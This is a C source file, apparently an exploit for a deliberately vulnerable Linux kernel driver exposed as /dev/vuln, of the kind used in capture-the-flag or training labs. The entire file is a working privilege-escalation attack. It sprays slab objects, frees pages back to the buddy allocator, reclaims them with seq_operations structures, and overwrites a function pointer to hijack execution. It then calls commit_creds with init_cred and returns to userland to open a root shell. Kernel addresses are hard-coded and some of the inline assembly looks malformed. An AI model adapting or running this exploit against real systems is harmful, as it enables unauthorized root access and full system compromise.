#include <stdio.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

typedef struct {
    int id;
    size_t size;
    char *data;
} request_t;

int fd;

void obj_alloc(int id) {
    request_t req = {.id = id};
    assert(ioctl(fd, CMD_ALLOC, &req) == 0);
}

void obj_write(int id, char *data, size_t size) {
    request_t req = {.id = id, .size = size, .data = data};
    assert(ioctl(fd, CMD_WRITE, &req) == 0);
}

void obj_free(int id) {
    request_t req = {.id = id};
    assert(ioctl(fd, CMD_FREE, &req) == 0);
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

void save_state() {
    asm volatile (
        "movq %0, cs\n"
        "movq %1, ss\n"
        "movq %2, rsp\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        : 
        : "memory"
    );
}

void win() {
    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
}

void restore_state() {
    asm volatile(
        "swapgs\n"
        "movq [rsp + 0x00], %0\n"
        "movq [rsp + 0x08], %1\n"
        "movq [rsp + 0x10], %2\n"
        "movq [rsp + 0x18], %3\n"
        "movq [rsp + 0x20], %4\n"
        "iretq\n"
        :
        : "r"(win), "r"(user_cs), "r"(user_rflags), "r"(user_rsp), "r"(user_ss)
    );
}

#define addr_init_cred      0xffffffff81e3bfa0
#define addr_commit_creds   0xffffffff812a1050

void escalate_privilege() {
    void (*commit_creds) (void *) = (void *)addr_commit_creds;
    commit_creds((void *)addr_init_cred);
    restore_state();
}

int main(void) {
    save_state();
    
    fd = open("/dev/vuln", O_RDONLY);
    assert(fd != -1);

    int objs_per_slab = 8;
    int cpu_partial = 52;
    int num_sprary = objs_per_slab * (cpu_partial + 1);

    printf("[*] Allocating %#x objects to obtain %#x full slabs\n", num_sprary, cpu_partial + 1);
    for (int i = 0; i < num_sprary; i++) {
        obj_alloc(i);
    }

    puts("[*] Allocating 0x1 object to obtain new active slab");
    obj_alloc(num_sprary);

    puts("[*] Freeing objects to release order-0 pages back to the buddy allocator");
    for (int i = 0; i < num_sprary; i += objs_per_slab) {
        if (i % (objs_per_slab * 2) == 0) {
            for (int j = i; j < i + objs_per_slab; j++) {
                obj_free(j);
            }
        } else {
            obj_free(i);
        }
    }
    
    // You can now reclaim order-0 pages to use as different slab caches.
    // Here, we reuse the memory as struct seq_operations (kmalloc-32) and perform ret2user.
    puts("[*] Spraying struct seq_operations to reclaim order-0 pages");
    int seqfds[0x20];
    for (int i = 0; i < 0x20; i++) {
        seqfds[i] = open("/proc/self/stat", O_RDONLY);
        assert(seqfds[i] >= 0);
    }
    
    puts("[*] Hijacking RIP");
    char payload[0x8];
    *(unsigned long *)&payload = (unsigned long)escalate_privilege;

    for (int i = 0; i < num_sprary; i += objs_per_slab) {
        if (i % (objs_per_slab * 2) == 0) {
            obj_write(i, payload, 0x8);
        }
    }
    
    for (int i = 0; i < 0x20; i++) {
        read(seqfds[i], payload, 1);
    }
}